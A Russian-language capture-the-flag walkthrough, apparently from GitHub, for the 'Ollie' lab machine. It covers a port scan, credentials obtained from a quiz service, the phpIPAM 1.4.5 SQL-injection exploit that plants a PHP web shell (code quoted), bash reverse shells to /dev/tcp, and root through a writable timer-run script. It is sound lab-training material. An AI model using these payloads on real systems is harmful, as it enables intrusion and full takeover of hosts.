### ДЛЯ РЕШЕНИЯ НЕОБХОДИМО:
- устанавливать соединение с целью
- разобраться с жксплойтом ipam
- понимать принцип работы таймера и уметь отслеживать процессы
### ВЗЯТИЕ ШЕЛЛА:
сначала по классике сканим порты, вывод щедрый
```
PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 62 OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: ...
80/tcp   open  http    syn-ack ttl 62 Apache httpd 2.4.41 ((Ubuntu))
|_http-favicon: Unknown favicon MD5: 851615F43921F017A297184922B4FBFD
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-title: Ollie :: login
|_Requested resource was http://10.114.170.172/index.php?page=login
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| http-robots.txt: 2 disallowed entries 
|_/ /immaolllieeboyyy
1337/tcp open  waste?  syn-ack ttl 61
| fingerprint-strings: 
|   DNSStatusRequestTCP, GenericLines: 
|     Hey stranger, I'm Ollie, protector of panels, lover of deer antlers.
|     What is your name? What's up, 
|     It's been a while. What are you here for?
|   DNSVersionBindReqTCP: 
|     Hey stranger, I'm Ollie, protector of panels, lover of deer antlers.
|     What is your name? What's up, 
|     version
|     bind
|     It's been a while. What are you here for?
|     ...
```
видим, что на 1337 порту у нас неизвестная служба(просто скрипт?) и какую-то поддиректорию, вытащенную из ```robots.txt```. в поддиректории ниче интересного не оказалось, просто ссылка на клип, но мб это то самое имя, о котором нас спрашивают по 1337 порту? попробуем установить соединение: ```nc ip 1337```. успешно!
```
Hey stranger, I'm Ollie, protector of panels, lover of deer antlers.

What is your name? immaolllieeboyyy
What's up, Immaolllieeboyyy! It's been a while. What are you here for?
Ya' know what? Immaolllieeboyyy. If you can answer a question about me, I might have something for you.
What breed of dog am I? I'll make it a multiple choice question to keep it easy: Bulldog, Husky, Duck or Wolf?
> *
You are correct! Let me confer with my trusted colleagues; Benny, Baxter and Connie...
Please hold on a minute
Ok, I'm back.
After a lengthy discussion, we've come to the conclusion that you are the right person for the job.Here are the credentials for our administration panel.

                    Username: *
                    Password: *

PS: Good luck and next time bring some treats!
```
это интерактивный скрипт, но я прочекала, на что-то влияет только ответ про породу собаки, имя оказалось не нужно. но окей, теперь у нас есть креды (проверила - по ssh с ними не подключиться). тогда самое время переходить на веб-сайт. заходим, сразу попадаем на форму логина и вводим туда найденные креды - теперь мы внутри (админская панель phpIPAM для сисадминов, чтобы управлять айпи адресами в сети). снизу висит вот такая интересная плашка(которой, по-хорошему, даже в админской панели быть не должно):

<img width="273" height="38" alt="image" src="https://github.com/user-attachments/assets/217cea2a-04ed-4c94-bc08-f04c96ca31fb" />

сразу решила посмотреть эксплойты - бинго 
```
> searchsploit phpipam 1.4.5
----------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                         |  Path
----------------------------------------------------------------------- ---------------------------------
phpIPAM 1.4.5 - Remote Code Execution (RCE) (Authenticated)            | php/webapps/50963.py
```
сам эксплойт выглядит вот так (юзает sqli, тк в этой версии была допущена ошибка в фильтрации данных в разделе «routing» (маршрутизация). приложение не проверяло должным образом, что именно пользователь вводит в поле поиска подсети, что и ведет к sqli). вот самая ключевая часть эксплойта, которая демонстрирует его суть: берет куки авторизованного пользователя, а после посылает нагрузку из юнион инъекции с шестнадцатеричным литералом (пэйлоад типа ```" UNION SELECT 1,'<?php system($_GET[ cmd ]); ?>',3,4 INTO OUTFILE...```), который сохраняет файл, вызов которого дает нам возможность вызывать evil.php и передавать параметры через cmd
Важные условия, чтобы это сработало:
- у MySQL-пользователя, под которым выполняется запрос, должно быть право на запись файлов (FILE privilege).
- Директория должна существовать и быть доступной для записи процессу mysqld.
- Если файл уже существует, команда не перезапишет его (защита от случайной перезаписи).

путь /var/www/html/ — стандартная корневая папка веб-сервера Apache, поэтому после создания файл становится доступен по URL.
```
def exploit(url, auth_cookie, path, command):
        print(colored("[...] Exploiting", "blue"))
        vulnerable_path = "app/admin/routing/edit-bgp-mapping-search.php"
        data = {
        "subnet": f"\" Union Select 1,0x201c3c3f7068702073797374656d28245f4745545b2018636d6420195d293b203f3e201d,3,4 INTO OUTFILE '{path}/evil.php' -- -",
        "bgp_id": "1"
        }
        cookies = {
        "phpipam": auth_cookie
        }
        requests.post(f"{url}/{vulnerable_path}", data=data, cookies=cookies)
        test = requests.get(f"{url}/evil.php")
        if test.status_code != 200:
                return print(colored(f"[-] Something went wrong. Maybe the path isn't writable. You can still abuse of the SQL injection vulnerability at {url}/index.php?page=tools&section=routing&subnetId=bgp&sPage=1", "red"))
        if "--shell" in argv:
                while True:
                        command = input("Shell> ")
                        r = requests.get(f"{url}/evil.php?cmd={command}")
                        print(r.text)
        else:
                print(colored(f"[+] Success! The shell is located at {url}/evil.php. Parameter: cmd", "green"))
                r = requests.get(f"{url}/evil.php?cmd={command}")
                print(f"\n\n[+] Output:\n{r.text}")
```
запускаем скрипт

```
python3 /usr/share/exploitdb/exploits/php/webapps/50963.py -url 'http://ip' -usr admin -pwd '*' -cmd 'bash -c "bash -i >& /dev/tcp/192.168.154.161/5555 0>&1"'

█▀█ █░█ █▀█ █ █▀█ ▄▀█ █▀▄▀█   ▄█ ░ █░█ ░ █▀   █▀ █▀█ █░░ █   ▀█▀ █▀█   █▀█ █▀▀ █▀▀
█▀▀ █▀█ █▀▀ █ █▀▀ █▀█ █░▀░█   ░█ ▄ ▀▀█ ▄ ▄█   ▄█ ▀▀█ █▄▄ █   ░█░ █▄█   █▀▄ █▄▄ ██▄

█▄▄ █▄█   █▄▄ █▀▀ █░█ █ █▄░█ █▀▄ █▄█ █▀ █▀▀ █▀▀
█▄█ ░█░   █▄█ ██▄ █▀█ █ █░▀█ █▄▀ ░█░ ▄█ ██▄ █▄▄

[...] Trying to log in as admin
[+] Login successful!
[...] Exploiting
[+] Success! The shell is located at http://10.114.170.172/evil.php. Parameter: cmd


[+] Output:
1               3       4
```
бинго! теперь можем спокойно передавать что душа пожелает через cmd. url энкодим что-то вроде (решила простенький реверсшелл закинуть) ```bash -c "bash -i >& /dev/tcp/your_ip/5555 0>&1"```, открываем листнинг порта ```nc -lvnp 5555``` и ловим реверсшелл!

### Взятие рута
подключившись, сразу проверила /etc/passwd. там есть некоторый пользователь ollie (имя совпадает с акком на веб-сервере), попробовала подрубиться к нему по найденным кредам - сработало. читаем ```user.txt``` и подгружаем линпис. в это время в ```config.php``` нашла пароль от дб, полазила по ней(также интерес могли бы представлять ```config.docker.php``` и ```install.txt```, но ничего особо полезного там не нашла). в выводе линписа есть такая интересная строчка:

```
╔══════════╣ Writable root-owned executables I can modify (max 200) (T1574.009,T1574.010)                      
-rwxrw-r-- 1 root ollie 30 Feb 12  2022 /usr/bin/feedme
```
пользователь рут, а мы в группе и можем редактировать файл. также существует system timer, который этот скрипт запускает (каждые 53 секунды выходит?)
```
Wed 2026-05-13 20:45:00 UTC 40s left      Wed 2026-05-13 20:44:06 UTC 13s ago              feedme.timer                 feedme.service
```
решила удостовериться, подгрузив на машину ```pspy64``` (вообще, хотела просто его в деле проверить, на самом деле проверка излишня)
```
2026/05/13 21:53:04 CMD: UID=0     PID=69031  | (feedme)
```
теперь просто записываем нужный пэйлоад в фидми (```echo 'bash -c "bash -i >& /dev/tcp/ip/4444 0>&1"' >> feedme```) и ловим реверсшелл на хосте

<img width="644" height="150" alt="image" src="https://github.com/user-attachments/assets/552c4d3e-eff0-47ca-bd35-ba38bc590e81" />

флаг взят😎
